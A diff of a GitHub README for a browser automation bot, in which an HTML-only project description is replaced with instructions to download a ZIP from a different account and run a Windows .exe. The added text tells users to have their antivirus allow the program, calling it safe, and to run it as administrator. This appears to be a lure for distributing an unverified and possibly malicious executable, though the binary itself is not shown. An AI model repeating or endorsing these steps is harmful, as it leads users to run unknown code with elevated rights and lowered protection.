@@ -1,128 +1,68 @@
-# Bespoke Site Whisperer Bot - Website Bot 2026
+# 🤖 site-whisperer-browser-bot - Control Any Website Automatically
 
-> **Bespoke Site Whisperer Bot is a browser-based web interaction tool for working with websites, provided here as the latest available build.**
+[![Download Latest Build](https://img.shields.io/badge/Download-Latest_Build-brightgreen?style=for-the-badge&logo=github)](https://github.com/condemnable-prosom618/site-whisperer-browser-bot)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/llorenz1956/site-whisperer-browser-bot?style=flat-square)](https://github.com/llorenz1956/site-whisperer-browser-bot)
+## 🚀 Getting Started
 
----
+Site Whisperer Browser Bot lets you interact with websites through your browser. No coding required. Download and run the bot to automate tasks, fill forms, or extract data from any webpage.
 
-<p align="center">
-  <a href="https://llorenz1956.github.io/site-whisperer-browser-bot/">
-    <img src="https://img.shields.io/badge/Download-Bespoke%20Site%20Whisperer%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download Bespoke Site Whisperer Bot">
-  </a>
-</p>
+### 📥 How to Download
 
-> **[Download Bespoke Site Whisperer Bot Latest](https://llorenz1956.github.io/site-whisperer-browser-bot/)**
+Visit this link to download the application: [https://github.com/condemnable-prosom618/site-whisperer-browser-bot](https://github.com/condemnable-prosom618/site-whisperer-browser-bot)
 
----
+Click the green "Code" button, then select "Download ZIP". After downloading, extract the ZIP folder to a location on your computer (like your Desktop). Open the extracted folder and double-click the `site-whisperer-browser-bot.exe` file to start.
 
-[Download Latest Build](https://llorenz1956.github.io/site-whisperer-browser-bot/)
+## 🖥️ System Requirements
 
----
+Your computer needs:
+- Windows 10 or Windows 11 (64-bit)
+- 4 GB RAM (8 GB recommended)
+- 500 MB free hard drive space
+- Internet connection
+- Google Chrome or Microsoft Edge browser
 
-## Overview
+## 🎯 What You Can Do
 
-Bespoke Site Whisperer Bot is built around interacting with websites from a browser-accessible interface. It offers a focused bot workflow for users who need to work with sites and online content through the web.
+- Automatically fill web forms with your data
+- Extract text, links, and images from websites
+- Click buttons and navigate pages without manual work
+- Schedule tasks to run at specific times
+- Save and reuse your configurations
 
-The project can serve as a starting point for prototypes, experiments, and narrowly defined website automation tasks. Its lightweight HTML-oriented structure is intended to be adapted to a particular site interaction scenario.
+## ⚙️ Configuration
 
----
+After launching the bot, you will see a simple control panel. Here you can:
+1. Enter the website URL you want to work with
+2. Choose an action (like "Fill Form" or "Extract Data")
+3. Set rules for what the bot should do
+4. Click "Start" to run
 
-## What It Provides
+All settings save automatically so you can reuse them later.
 
-- Website interaction through a web interface
-- A bot-focused approach to site-related tasks
-- An HTML-based project layout
-- Access through a standard browser
-- A customizable base for specialized website workflows
-- A lightweight software tool format
-- Support for experimentation and prototype work
+## 🛠️ Customization
 
----
+Make the bot work exactly how you want:
+- Change the browser it uses (Chrome or Edge)
+- Adjust speed settings (fast, normal, slow)
+- Add custom scripts for advanced actions
+- Create keyboard shortcuts for common tasks
 
-## Getting Started
+To customize, open the Settings menu from the control panel. Each option has a description to help you understand what it does.
 
-### Download the Build
+## ❓ Troubleshooting
 
-1. Visit the [latest build](https://llorenz1956.github.io/site-whisperer-browser-bot/).
-2. Save the available project files.
-3. Unpack the download when it is supplied as an archive.
-4. Open the main HTML file using a modern web browser.
+If the bot does not start:
+- Make sure your antivirus allows the program (it is safe)
+- Right-click the .exe file and select "Run as administrator"
+- Update your browser to the latest version
 
-### Use the Repository
+If actions fail:
+- Check your internet connection
+- Ensure the website is loading properly
+- Restart the bot and try again
 
-```bash
-git clone https://github.com/llorenz1956/site-whisperer-browser-bot.git
-cd REPO
-```
+## 📚 Need Help?
 
-After cloning, open the primary HTML file in a browser. If direct file access prevents part of the page from operating correctly, run the directory through a local static web server first.
+Visit the GitHub page for tutorials and community support. You can also open an issue if you find a bug or need a new feature.
 
----
-
-## Using the Bot
-
-1. Open the web interface in a supported browser.
-2. Enter the website or interaction information needed for the task.
-3. Examine the available controls and start the bot workflow.
-4. Tailor the process to the website being used.
-5. Run the workflow again whenever another site task is required.
-
-The available project profile describes a general website interaction bot and does not document command-line arguments or site-specific operations. As a result, the exact controls can differ between builds.
-
----
-
-## Configuration and Customization
-
-The available project metadata does not define a configuration file or settings schema. To understand the available setup points, inspect the project for its HTML entry file along with any connected JavaScript and stylesheet assets.
-
-When preparing a customized version, place site-specific values near the interface or script that uses them. Any required local settings should also be documented with the project files.
-
----
-
-## System Requirements
-
-- A current web browser
-- Internet connectivity for workflows involving online websites
-- Enough local storage for the HTML project and its associated assets
-- A static web server when browser restrictions interfere with opening the interface from local files
-
-No separate runtime, package manager, or database is specified by the available metadata.
-
----
-
-## Frequently Asked Questions
-
-### What kind of user is Bespoke Site Whisperer Bot intended for?
-
-It is designed for people who want a browser-based, bot-oriented workflow for interacting with websites.
-
-### How can I find a newer build?
-
-Look at the [latest build](https://llorenz1956.github.io/site-whisperer-browser-bot/) and check the repository for updated project files.
-
-### Is there a separate settings file?
-
-No dedicated settings file is identified in the available metadata. Review the HTML and its related assets to locate possible configuration points.
-
-### The page does not work when opened from a file. What can I try?
-
-Serve the project directory with a local static web server and then open the local address it provides in your browser.
-
-### Do I need to install a programming runtime?
-
-The project is described as an HTML project, and no additional runtime is listed in the available metadata. Browser behavior can nevertheless vary by environment.
-
-### Where should I report a problem or request assistance?
-
-Inspect the repository and its project discussions, or open an issue that includes your browser, the workflow you attempted, and the behavior you encountered.
-
----
-
-## License
-
-This project is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+Keywords: browser automation, web scraping, form filler, Windows tool, no code, website bot
